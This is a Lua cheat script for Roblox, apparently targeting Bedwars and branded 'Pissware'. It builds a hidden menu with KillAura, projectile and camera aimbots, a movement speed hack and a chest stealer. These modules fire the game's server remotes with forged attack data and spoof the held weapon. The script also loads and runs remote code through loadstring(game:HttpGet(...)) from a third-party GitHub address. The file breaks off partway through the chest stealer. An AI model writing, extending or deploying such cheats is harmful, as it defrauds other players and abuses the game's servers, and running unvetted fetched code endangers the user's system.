
Players = game:GetService("Players")
Lighting = game:GetService("Lighting")
local CollectionService = game:GetService("CollectionService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
UserInputService = game:GetService("UserInputService")
LocalPlayer = Players.LocalPlayer
Character = LocalPlayer.Character
Humanoid = Character.Humanoid
PrimaryPart = Character.PrimaryPart
PlayerGui = LocalPlayer.PlayerGui
PlayerScripts = LocalPlayer.PlayerScripts
Camera = workspace.Camera
CurrentCamera = workspace.CurrentCamera
RunService = game["Run Service"]
TweenService = game.TweenService
local inventory = workspace[LocalPlayer.Name].InventoryFolder.Value
local CollectionService = game:GetService("CollectionService")
local PurchaseItemRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem")
local ResetCharacterRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ResetCharacter")



local ReplicatedStorage = game:GetService("ReplicatedStorage")

local GuiLibrary = {Version = "1",CustomEdition = "",WindowCount = 0, API = {Windows = {},buttons = {}}}
local utilityToggles = {}
local entity = {gui = game.Players.LocalPlayer.PlayerGui,HumanoidRootPart=function() return game.Players.LocalPlayer.Character.PrimaryPart end}
local protectInstance = function(v) v.Name = math.random() end
local gui = Instance.new("ScreenGui",entity.gui)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
protectInstance(gui)

local canSave = true

local ArrayFrame = Instance.new("Frame",gui)
ArrayFrame.BackgroundTransparency = 1
ArrayFrame.AnchorPoint = Vector2.new(1,0)
ArrayFrame.Position = UDim2.fromScale(1,0.1)
ArrayFrame.Size = UDim2.fromScale(0.2,1)
local arrayFrameSorter = Instance.new("UIListLayout",ArrayFrame)
arrayFrameSorter.SortOrder = Enum.SortOrder.LayoutOrder
arrayFrameSorter.HorizontalAlignment = Enum.HorizontalAlignment.Right


shared.AutumnLoaded = false

local speed = 0.09420

local userInputService = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local isEnabled = false
local moveDirection = Vector3.new()

local function setupCharacter(character)
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")

    local function updateMoveDirection()
        if not isEnabled then return end  

        moveDirection = Vector3.new()
        if userInputService:IsKeyDown(Enum.KeyCode.W) then
            moveDirection = moveDirection + Vector3.new(0, 0, -1)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.S) then
            moveDirection = moveDirection + Vector3.new(0, 0, 1)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.A) then
            moveDirection = moveDirection + Vector3.new(-1, 0, 0)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.D) then
            moveDirection = moveDirection + Vector3.new(1, 0, 0)
        end
    end

    userInputService.InputBegan:Connect(function(input, isProcessed)
        if isProcessed then return end
        updateMoveDirection()
    end)

    userInputService.InputEnded:Connect(function(input, isProcessed)
        if isProcessed then return end
        updateMoveDirection()
    end)

    runService.RenderStepped:Connect(function(deltaTime)
        if not isEnabled then return end  

        if moveDirection.Magnitude > 0 then
            moveDirection = moveDirection.Unit
            humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(moveDirection * speed)
        end
    end)

    local slowWalkSpeed = 14

    userInputService.InputBegan:Connect(function(input)
        if not isEnabled then return end 

        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.LeftShift then
            humanoid.WalkSpeed = slowWalkSpeed
        end
    end)

    userInputService.InputEnded:Connect(function(input)
        if not isEnabled then return end  

        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.LeftShift then
            humanoid.WalkSpeed = humanoid.WalkSpeed
        end
    end)
end


setupCharacter(player.Character or player.CharacterAdded:Wait())


player.CharacterAdded:Connect(setupCharacter)



local player = game.Players.LocalPlayer

-- Function to handle sending the player up
local function sendPlayerUp()
    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        local jumpVelocity = Vector3.new(0, 250, 0)  -- Adjust the Y component as needed for desired jump height
        humanoid.RootPart.Velocity = jumpVelocity
    end
end


local config = {
	["Buttons"] = {},
	["Toggles"] = {},
	["Pickers"] = {}
}

local configPath = "Pissware_Solara/Configs/"..game.PlaceId..".json"
makefolder("Pissware_Solara")
makefolder("Pissware_Solara/Configs")
local function saveConfig()
	if canSave then
		if isfile(configPath) then
			delfile(configPath)
		end
		writefile(configPath,game.HttpService:JSONEncode(config))
	end
end

local function loadConfig()
	config = (game.HttpService:JSONDecode(readfile(configPath)))
end

if not isfile(configPath) then
	saveConfig()
	task.wait(1)
end

loadConfig()

task.wait(1)

local TweenService = game:GetService("TweenService")

local arrayObjects = {}
local arraylist = function(state, module, extraText)
    if state then
        local label = Instance.new("TextLabel", ArrayFrame)
        label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        label.TextColor3 = Color3.fromRGB(145, 0, 255)  -- Pissware
        label.BackgroundTransparency = 0.6
        label.Size = UDim2.new(0, 0, 0.032, 0)  -- Pissware
        label.Text = module .. "  "
        label.RichText = true
        label.TextSize = 13
        label.BorderSizePixel = 0
        table.insert(arrayObjects, label)
        table.sort(arrayObjects, function(a, b)
            return game.TextService:GetTextSize(a.Text .. "  ", 30, Enum.Font.SourceSans, Vector2.new(0, 0)).X > game.TextService:GetTextSize(b.Text .. "  ", 30, Enum.Font.SourceSans, Vector2.new(0, 0)).X
        end)
        for i, v in ipairs(arrayObjects) do
            v.LayoutOrder = i
        end
        
        -- Pissware
        local size = UDim2.new(0, game.TextService:GetTextSize(module, 28, Enum.Font.SourceSans, Vector2.new(0, 0)).X, 0.033, 0)
        TweenService:Create(label, TweenInfo.new(0.5), {
            Size = size,
        }):Play()

        -- Pissware
        local line = Instance.new("Frame")
        line.Name = "RightLine"
        line.Parent = label
        line.AnchorPoint = Vector2.new(1, 0.5)
        line.BackgroundColor3 = Color3.fromRGB(145, 0, 255)  -- Pissware
        line.BorderSizePixel = 0
        line.Size = UDim2.new(0, 3, 1, 0)  -- Pissware
        line.Position = UDim2.new(1, 0, 0.5, 0)
    else
        for i, v in pairs(arrayObjects) do
            if v.Text == module .. "  " then
                table.remove(arrayObjects, i)
                
                -- 创建消失时的Tween动画
                local tween = TweenService:Create(v, TweenInfo.new(0.5), {
                    Size = UDim2.new(0, 0, 0.032, 0)
                })
                tween:Play()
                
                -- 在动画结束后移除label和右边线条
                tween.Completed:Connect(function()
                    v:Destroy()
                end)
            end
        end
        table.sort(arrayObjects, function(a, b)
            return game.TextService:GetTextSize(a.Text .. "  ", 30, Enum.Font.SourceSans, Vector2.new(0, 0)).X > game.TextService:GetTextSize(b.Text .. "  ", 30, Enum.Font.SourceSans, Vector2.new(0, 0)).X
        end)
        for i, v in ipairs(arrayObjects) do
            v.LayoutOrder = i
        end
    end
end

local notificationFrame = Instance.new("Frame",gui)
notificationFrame.Size = UDim2.fromScale()

local Notifications = {}
function GuiLibrary.CreateNotification(title,text,time)

end

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()


function CreateNotification(Title, Duration, Message)
    Notification:Notify(
        {Title = Title, Description = Message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = Duration, Type = "image"},
        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
    )
end

function CreateNotification2(Title, Duration, Message)
    Notification:Notify(
        {Title = Title, Description = Message},
        {OutlineColor = Color3.fromRGB(255, 255, 0), Time = Duration, Type = "image"},
        {Image = "http://www.roblox.com/asset/?id=6031071053", ImageColor = Color3.fromRGB(255, 255, 0)}
    )
end

function CreateNotificationStaffDetector(Title, Duration, Message)
    sound = Instance.new("Sound",workspace)
    sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
    sound.SoundId = "rbxassetid://7396762708"
    sound:Play()

    Notification:Notify(
        {Title = Title, Description = Message},
        {OutlineColor = Color3.fromRGB(255, 0, 0), Time = Duration, Type = "image"},
        {Image = "http://www.roblox.com/asset/?id=6031071053", ImageColor = Color3.fromRGB(255, 84, 84)}
    )
end

local notificationFrame = Instance.new("Frame",gui)
notificationFrame.Size = UDim2.fromScale()

local Notifications = {}
function GuiLibrary.CreateNotification(title,text,time)

end


function GuiLibrary.CreateWindow(name)
    local top = Instance.new("TextLabel", gui)
    local UICorner = Instance.new("UICorner")
    GuiLibrary.WindowCount += 1
    top.Position = UDim2.fromScale(0.02 + (0.12 * GuiLibrary.WindowCount), 0.07)
    top.Size = UDim2.fromScale(0.1, 0.045)
    top.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
    top.BorderSizePixel = 0
    top.TextColor3 = Color3.fromRGB(145, 0, 255)
    top.TextXAlignment = Enum.TextXAlignment.Left
    top.TextSize = 12
    top.Text = "  " .. name
    top.Font = Enum.Font.Gotham

    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = top

    -- 添加淡入淡出效果
    local function fadeIn(element)
        element.Visible = true
        element.BackgroundTransparency = 1
        game.TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0
        }):Play()
    end

    local function fadeOut(element)
        game.TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 1
        }):Play()
        wait(0.3)
        element.Visible = false
    end

    -- 初始狀態設置為隱藏
    top.Visible = false

    game.UserInputService.InputBegan:Connect(function(key, gpe)
        if gpe then return end
        if key.KeyCode == Enum.KeyCode.RightShift then
            top.Visible = not top.Visible
            if top.Visible then
                fadeIn(top)  -- 淡入效果
            else
                fadeOut(top)  -- 淡出效果
            end
        end
    end)

    local moduleFrame = Instance.new("Frame", top)
    moduleFrame.BackgroundTransparency = 1
    moduleFrame.Size = UDim2.fromScale(1, 20)
    moduleFrame.Position = UDim2.fromScale(0, 1)
    local moduleSorter = Instance.new("UIListLayout", moduleFrame)
    moduleSorter.SortOrder = Enum.SortOrder.LayoutOrder
    GuiLibrary.API.buttons[name] = {}
    moduleFrame.ChildAdded:Connect(function(v)
        if not v:IsA("TextButton") then return end
        v.LayoutOrder = #moduleFrame:GetChildren()
    end)

    GuiLibrary.API.Windows[name] = {
        CreateButton = function(tab)
            if config.Buttons[tab["Name"]] == nil then
                config.Buttons[tab["Name"]] = {Enabled = false, Keybind = "Unknown"}
            end

            local button = Instance.new("TextButton", moduleFrame)
            button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            button.Size = UDim2.fromScale(1, 0.045)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.TextXAlignment = Enum.TextXAlignment.Left
            button.Text = "  " .. tab["Name"]
            button.TextSize = 12
            button.Font = Enum.Font.Gotham
            button.BorderSizePixel = 0
            table.insert(GuiLibrary.API.buttons[name], button)

            local dropdownFrame = Instance.new("Frame", moduleFrame)
            dropdownFrame.Size = UDim2.fromScale(1, 1)
            dropdownFrame.BackgroundTransparency = 1
            dropdownFrame.Visible = false
            dropdownFrame.LayoutOrder = 900000000
            local dropdownFrameSorter = Instance.new("UIListLayout", dropdownFrame)

            local keybindButton = Instance.new("TextButton", dropdownFrame)
            keybindButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
            keybindButton.Size = UDim2.fromScale(1, 0.045)
            keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            keybindButton.TextXAlignment = Enum.TextXAlignment.Left
            keybindButton.Text = "  Keybind : "
            keybindButton.TextSize = 12
            keybindButton.Font = Enum.Font.Gotham
            keybindButton.BorderSizePixel = 0

            local keybind = Enum.KeyCode[tostring(config.Buttons[tab["Name"]].Keybind)]
            if keybind ~= Enum.KeyCode.Unknown then
                keybindButton.Text = "  Keybind : " .. tostring(config.Buttons[tab["Name"]].Keybind)
            end

            local keybindConnection
            keybindButton.MouseButton1Down:Connect(function()
                keybindConnection = game.UserInputService.InputBegan:Connect(function(key, gpe)
                    if gpe then return end
                    keybindButton.Text = "  Keybind : " .. tostring(key.KeyCode):split(".")[3]
                    config.Buttons[tab["Name"]].Keybind = tostring(key.KeyCode):split(".")[3]
                    task.wait(0.06)
                    saveConfig()
                    keybind = key.KeyCode
                    keybindConnection:Disconnect()
                end)
            end)

            local btn
            btn = {
                Enabled = false,
                ToggleButton = function(t)
                    tab["Function"](t)
                    btn.Enabled = t
                    button.TextColor3 = (t and Color3.fromRGB(145, 0, 255) or Color3.fromRGB(255, 255, 255))
                    arraylist(t, tab["Name"], tab["Extratext"])
                    config.Buttons[tab["Name"]].Enabled = t
                    task.wait(0.005)
                    saveConfig()
                end,
                CreateToggle = function(tab2)
                    if config.Toggles[tab2["Name"] .. tab["Name"]] == nil then
                        config.Toggles[tab2["Name"] .. tab["Name"]] = {Enabled = false}
                    end

                    local button = Instance.new("TextButton", dropdownFrame)
                    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                    button.Size = UDim2.fromScale(1, 0.045)
                    button.TextColor3 = Color3.fromRGB(255, 255, 255)
                    button.TextXAlignment = Enum.TextXAlignment.Left
                    button.Text = "  " .. tab2["Name"]
                    button.TextSize = 12
                    button.Font = Enum.Font.Gotham
                    button.BorderSizePixel = 0
                    local state = {Enabled = false}
                    button.MouseButton1Down:Connect(function()
                        state.Enabled = not state.Enabled
                        button.TextColor3 = (state.Enabled and Color3.fromRGB(145, 0, 255) or Color3.fromRGB(255, 255, 255))
                        if tab2["Function"] then
                            tab2["Function"](state.Enabled)
                        end
                        config.Toggles[tab2["Name"] .. tab["Name"]].Enabled = state.Enabled
                        task.wait(0.06)
                        saveConfig()
                    end)
                    task.spawn(function()
                        if config.Toggles[tab2["Name"] .. tab["Name"]].Enabled then
                            repeat task.wait() until shared.AutumnLoaded == true
                            state.Enabled = true
                            button.TextColor3 = (state.Enabled and Color3.fromRGB(145, 0, 255) or Color3.fromRGB(255, 255, 255))
                            if tab2["Function"] then
                                tab2["Function"](state.Enabled)
                            end
                        end
                    end)
                    return state
                end,
                CreatePicker = function(tab2)
                    if config.Pickers[tab2["Name"] .. tab["Name"]] == nil then
                        config.Pickers[tab2["Name"] .. tab["Name"]] = {Value = tab2["Options"][1]}
                    end

                    local button = Instance.new("TextButton", dropdownFrame)
                    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                    button.Size = UDim2.fromScale(1, 0.045)
                    button.TextColor3 = Color3.fromRGB(255, 255, 255)
                    button.TextXAlignment = Enum.TextXAlignment.Left
                    button.Text = "  " .. tab2["Name"] .. ": " .. tab2["Options"][1]
                    button.TextSize = 12
                    button.Font = Enum.Font.Gotham
                    button.BorderSizePixel = 0
                    local state = {Value = tab2["Options"][1]}
                    local index = 1
                    button.MouseButton1Down:Connect(function()
                        index = (index + 1)
                        if index > #tab2["Options"] then
                            index = 1
                        end
                        if tab2["Function"] then
                            tab2["Function"](tab2["Options"][index])
                        end
                        button.Text = "  " .. tab2["Name"] .. " : " .. tab2["Options"][index]
                        state.Value = tab2["Options"][index]
                        config.Pickers[tab2["Name"] .. tab["Name"]].Value = tab2["Options"][index]
                        task.wait(0.06)
                        saveConfig()
                    end)
                    task.spawn(function()
                        repeat task.wait()
                            index = (index + 1)
                            if index > #tab2["Options"] then
                                index = 1
                            end
                            if tab2["Function"] then
                                tab2["Function"](tab2["Options"][index])
                            end
                            button.Text = "  " .. tab2["Name"] .. " : " .. tab2["Options"][index]
                            state.Value = tab2["Options"][index]
                        until state.Value == config.Pickers[tab2["Name"] .. tab["Name"]].Value
                    end)
                    return state
                end,
            }

            utilityToggles[tab["Name"]] = function(t)
                btn.ToggleButton(t)
            end

            button.MouseButton1Down:Connect(function()
                btn.ToggleButton(not btn.Enabled)
            end)

            if config.Buttons[tab["Name"]].Enabled then
                task.spawn(function()
                    repeat task.wait() until shared.AutumnLoaded == true
                    btn.ToggleButton(true)
                end)
            end

            game.UserInputService.InputBegan:Connect(function(key, gpe)
                if gpe or not canSave then return end
                if key.KeyCode == Enum.KeyCode.Unknown then return end
                if key.KeyCode == keybind then
                    btn.ToggleButton(not btn.Enabled)
                end
            end)

            button.MouseButton2Down:Connect(function()
                dropdownFrame.Visible = not dropdownFrame.Visible
                for i, v in pairs(GuiLibrary.API.buttons[name]) do
                    v.Visible = not dropdownFrame.Visible
                end
                button.Visible = true
            end)

            return btn
        end,
    }

    return GuiLibrary.API.Windows[name]
end



GuiLibrary.CreateWindow("Combat")
GuiLibrary.CreateWindow("Blatant")
GuiLibrary.CreateWindow("Utility")
GuiLibrary.CreateWindow("Visuals")
GuiLibrary.CreateWindow("World")
GuiLibrary.CreateWindow("Gui")

local spawnConnections = {}

local lplr = game.Players.LocalPlayer
local inventory = workspace[lplr.Name].InventoryFolder.Value

lplr.CharacterAdded:Connect(function(char)
	repeat task.wait() until char ~= nil
	for i,v in next, spawnConnections do
		task.spawn(function() v(char) end)
	end
end)

table.insert(spawnConnections,function(char)
	task.wait(1)
	inventory = workspace[lplr.Name].InventoryFolder.Value
end)

local weaponMeta = {
	{"rageblade", 100},
	{"emerald_sword", 99},
	{"deathbloom", 99},
	{"glitch_void_sword", 98},
	{"sky_scythe", 98},
	{"diamond_sword", 97}, 
	{"iron_sword", 96},
	{"stone_sword", 95},
	{"wood_sword", 94},
	{"emerald_dao", 93},
	{"diamond_dao", 99},
	{"diamond_dagger", 99},
	{"diamond_great_hammer", 99},
	{"diamond_scythe", 99},
	{"iron_dao", 97},
	{"iron_scythe", 97},
	{"iron_dagger", 97},
	{"iron_great_hammer", 97},
	{"stone_dao", 96},
	{"stone_dagger", 96},
	{"stone_great_hammer", 96},
	{"stone_scythe", 96},
	{"wood_dao", 95},
	{"wood_scythe", 95},
	{"wood_great_hammer", 95},
	{"wood_dagger", 95},
	{"frosty_hammer", 1},
}

local function hasItem(item)
	if inventory:FindFirstChild(item) then
		return true, 1
	end
	return false
end

local function getBestWeapon()
	local bestSword
	local bestSwordMeta = 0
	for i, sword in ipairs(weaponMeta) do
		local name = sword[1]
		local meta = sword[2]
		if meta > bestSwordMeta and hasItem(name) then
			bestSword = name
			bestSwordMeta = meta
		end
	end
	return inventory:FindFirstChild(bestSword)
end

local function newChat(msg)
    local args = {
        [1] = msg,
        [2] = "All"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end

local function getNearestPlayer(range)
	local nearest
	local nearestDist = 9e9
	for i,v in pairs(game.Players:GetPlayers()) do
		pcall(function()
			if v == lplr or v.Team == lplr.Team then return end
			if v.Character.Humanoid.Health > 0 and (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude < nearestDist and (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude <= range then
				nearest = v
				nearestDist = (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude
			end
		end)
	end
	return nearest
end

local CIRCLE_RADIUS = 12
local CIRCLE_THICKNESS = 0.2
local CIRCLE_COLOR = BrickColor.new("Bright red")
local NUM_SEGMENTS = 64

local circleParts = {}

local function createNeonPart(parent, angle, radius, thickness, color)
    local part = Instance.new("Part")
    part.Size = Vector3.new(thickness, thickness, thickness)
    part.Anchored = true
    part.CanCollide = false
    part.BrickColor = color
    part.Material = Enum.Material.Neon
    part.Transparency = 0.5
    part.Position = parent.Position + Vector3.new(math.cos(angle) * radius, 0.5, math.sin(angle) * radius)
    part.Parent = parent
    return part
end

local function updatePosition(character)
    if character then
        local rootPosition = character.HumanoidRootPart.Position
        for i, part in ipairs(circleParts) do
            local angle = math.rad((360 / NUM_SEGMENTS) * (i - 1))
            part.Position = rootPosition + Vector3.new(math.cos(angle) * CIRCLE_RADIUS, 0.5, math.sin(angle) * CIRCLE_RADIUS)
        end
    end
end

local function createCircle(character)
    if not character then return end
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    for i = 1, NUM_SEGMENTS do
        local angle = math.rad((360 / NUM_SEGMENTS) * (i - 1))
        local part = createNeonPart(humanoidRootPart, angle, CIRCLE_RADIUS, CIRCLE_THICKNESS, CIRCLE_COLOR)
        table.insert(circleParts, part)
    end
    updatePosition(character)
    game:GetService("RunService").RenderStepped:Connect(function()
        updatePosition(character)
    end)
end

local function deleteCircle()
    for _, part in ipairs(circleParts) do
        part:Destroy()
    end
    circleParts = {}
end

local player = game.Players.LocalPlayer

local function getRemote(name)
	local remote
	for i,v in pairs(game:GetDescendants()) do
		if v.Name == name then
			remote = v
			break
		end
	end
	return remote
end

local SetInvItem = getRemote("SetInvItem")
local function spoofHand(item)
	if hasItem(item) then
		SetInvItem:InvokeServer({
			["hand"] = inventory:WaitForChild(item)
		})
	end
end

local knitRecieved, knit
knitRecieved, knit = pcall(function()
	repeat task.wait()
		return debug.getupvalue(require(game:GetService("Players")[lplr.Name].PlayerScripts.TS.knit).setup, 6)
	until knitRecieved
end)

local function getController(name)
	return knit.Controllers[name]
end

MainTargets = {}

local auraAnimations = {
	["FAST!!!"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
        {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
        {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
	},
}

local AuraRemote = getRemote("SwordHit")

local viewmodel = workspace.Camera.Viewmodel.RightHand.RightWrist
local weld = viewmodel.C0
local oldweld = viewmodel.C0

local TweenService = game.TweenService

table.insert(spawnConnections,function(char)
	task.wait(1)
	viewmodel = workspace.Camera.Viewmodel.RightHand.RightWrist
end)

local Animation = true
local animRunning = true
local reverseTween
Aura = GuiLibrary.API.Windows.Combat.CreateButton({
    ["Name"] = "KillAura",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                CreateNotification("KillAura", 1.2, "KillAura has been enabled")
                repeat task.wait()
                    if getNearestPlayer(25) ~= nil then
                        pcall(function()
                            local animation = auraAnimations["FAST!!!"]
                            local allTime = 0
                            task.spawn(function()
                                if Animation then
                                    animRunning = true
                                    for i, v in pairs(animation) do allTime += v.Timer end
                                    for i, v in pairs(animation) do
                                        local tween = game.TweenService:Create(viewmodel, TweenInfo.new(v.Timer), {C0 = oldweld * v.CFrame})
                                        tween:Play()
                                        task.wait(v.Timer + 0.01)
                                    end
                                    animRunning = false
                                    game.TweenService:Create(viewmodel, TweenInfo.new(1), {C0 = oldweld}):Play()
                                end
                            end)
                            task.wait(allTime)
                        end)
                    end
                until (not Aura.Enabled)
                CreateNotification("KillAura", 1.2, "KillAura has been disabled")
            end)

            task.spawn(function()
                repeat task.wait()
                    if AuraRotations.Enabled then
                        local entity = getNearestPlayer(25)
                        if entity then
                            lplr.Character.PrimaryPart.CFrame = CFrame.lookAt(lplr.Character.PrimaryPart.Position, Vector3.new(entity.Character.PrimaryPart.Position.X, lplr.Character.PrimaryPart.Position.Y, entity.Character.PrimaryPart.Position.Z))
                        end
                    end
                until (not Aura.Enabled)
            end)

            task.spawn(function()
                repeat task.wait()
                    pcall(function()
                        local entity = getNearestPlayer(25)
                        local weapon = getBestWeapon()
                        if entity == nil then return end
                        spoofHand(getBestWeapon().Name)
                        
                        AuraRemote:FireServer({
                            ["chargedAttack"] = {
                                ["chargeRatio"] = 0
                            },
                            ["entityInstance"] = entity.Character,
                            ["validate"] = {
                                ["targetPosition"] = {
                                    ["value"] = entity.Character.PrimaryPart.Position
                                },
                                ["selfPosition"] = {
                                    ["value"] = lplr.Character.PrimaryPart.Position
                                }
                            },
                            ["weapon"] = weapon
                        })
                    end)
                until (not Aura.Enabled)
            end)

             if RangeVisualizer.Enabled then
                  createCircle(lplr.character)
              else
                  deleteCircle()
                
             end

        else
            deleteCircle()
             end
        end
})

local animAuraTab = {}
for i, v in pairs(auraAnimations) do table.insert(animAuraTab, i) end


AuraRotations = Aura.CreateToggle({
    ["Name"] = "Locked View",
    ["Function"] = function() end,
})

RangeVisualizer = Aura.CreateToggle({
    ["Name"] = "Range Visualizer",
    ["Function"] = function(enabled)
        if not enabled then
            deleteCircle()
        end
    end,
})

local ProjectileFire = getRemote("ProjectileFire")

local function shoot(bow, pos)
	local args = {}
	if bow.Name:find("bow") then
		args = {
			[1] = bow,
			[2] = "arrow",
			[3] = "arrow",
			[4] = pos,
			[5] = pos + Vector3.new(0,2,0),
			[6] = Vector3.new(0,-5,0),
			[7] = tostring(game:GetService("HttpService"):GenerateGUID(true)),
			[8] = {
				["drawDurationSeconds"] = 1,
				["shotId"] = tostring(game:GetService("HttpService"):GenerateGUID(false))
			},
			[9] =  workspace:GetServerTimeNow() - 0.045
		}
	else
		args = {
			[1] = bow,
			[2] = bow.Name,
			[3] = bow.Name,
			[4] = pos,
			[5] = pos + Vector3.new(0,2,0),
			[6] = Vector3.new(0,-5,0),
			[7] = tostring(game:GetService("HttpService"):GenerateGUID(true)),
			[8] = {
				["drawDurationSeconds"] = 1,
				["shotId"] = tostring(game:GetService("HttpService"):GenerateGUID(false))
			},
			[9] =  workspace:GetServerTimeNow() - 0.045
		}
	end
	
	ProjectileFire:InvokeServer(unpack(args))
end

local function getAllBows()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("bow") or v.Name:find("fireball") or v.Name:find("snowball") or v.Name:find("lasso") then
			table.insert(bows,v)
		end
	end
	return bows
end

ProjectileAimbot = GuiLibrary.API.Windows.Combat.CreateButton({
	["Name"] = "ProjectileAimbot",
	["Function"] = function(callback)
		if callback then
			CreateNotification("ProjectileAimbot", 1.2, "ProjectileAimbot has been enabled")
			task.spawn(function()
				repeat task.wait()
					local target = getNearestPlayer(9e9)
					if target then
						local bows = getAllBows()
						for i,v in pairs(bows) do
							spoofHand(v.Name)
							task.wait(0)
							if v.Name == "fireball" or v.Name == "snowball" or v.Name == "lasso" or v.Name == "headhunter" then
								if not AllProjectiles.Enabled then continue end
							end
							shoot(v,target.Character.PrimaryPart.Position)
						end
					end
				until (not ProjectileAimbot.Enabled)
				CreateNotification("ProjectileAimbot", 1.2, "ProjectileAimbot has been disabled")
			end)
		else

		end
	end,
})

AllProjectiles = ProjectileAimbot.CreateToggle({
	["Name"] = "All Projectiles",
	["Function"] = function() end
})


local function shoot2(pos)
	local args = {
        [1] = {
            ["ProjectileRefId"] = tostring(game:GetService("HttpService"):GenerateGUID(true)),
            ["direction"] = Vector3.new(19.34561538696289, -41.82197952270508, -235.53485107421875),
            ["fromPosition"] = pos,
            ["initialVelocity"] = Vector3.new(19.34561538696289, -41.82197952270508, -235.53485107421875)
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("OwlFireProjectile"):InvokeServer(unpack(args))
end

OwlAimbot = GuiLibrary.API.Windows.Combat.CreateButton({
    ["Name"] = "OwlSilentAimbot",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("OwlAimbot", 1.2, "OwlAimbot has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    local target = getNearestPlayer(9e9)
                    if target then
                        task.wait(0)
                        shoot2(target.Character.PrimaryPart.Position)
                    end
                until not OwlAimbot.Enabled
                CreateNotification("OwlAimbot", 1.2, "OwlAimbot has been disabled")
            end)
        end
    end,
})

AimAssist = GuiLibrary.API.Windows.Combat.CreateButton({
    ["Name"] = "AimAssist",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                CreateNotification("AimAssist", 1.2, "AimAssist has been enabled")
                repeat task.wait(0)
                    local Entity = getPlayer(25)
                    if Entity then
                        setCameraToPlayer(Entity)
                    end
                until (not AimAssist.Enabled)
                CreateNotification("AimAssist", 1.2, "AimAssist has been disabled")
            end)
        end
    end,
})

function getPlayer(maxDistance)
    local player = game.Players.LocalPlayer
    local nearestPlayer = nil
    local shortestDistance = maxDistance

    for _, target in pairs(game.Players:GetPlayers()) do
        if target ~= player and target.Team ~= player.Team and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (target.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            -- Check if the player's health is greater than 0.1
            if target.Character.Humanoid.Health > 0.1 then
                if distance < shortestDistance then
                    nearestPlayer = target
                    shortestDistance = distance
                end
            end
        end
    end

    return nearestPlayer
end

function setCameraToPlayer(target)
    local player = game.Players.LocalPlayer
    local camera = game.Workspace.CurrentCamera
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local targetPosition = target.Character.HumanoidRootPart.Position
        camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
    end
end


local chests = {}
for i,v in pairs(workspace:GetChildren()) do
	if v.Name == "chest" then
		table.insert(chests,v)
	end
end
local chests = {}
for i,v in pairs(workspace:GetChildren()) do
	if v.Name == "chest" then
		table.insert(chests,v)
	end
end
Stealer = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "ChestStealer",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("ChestStealer", 1.2, "ChestStealer has been enabled")
				repeat task.wait()
					task.wait(0.15)
					task.spawn(function()
						for i, v in pairs(chests) do
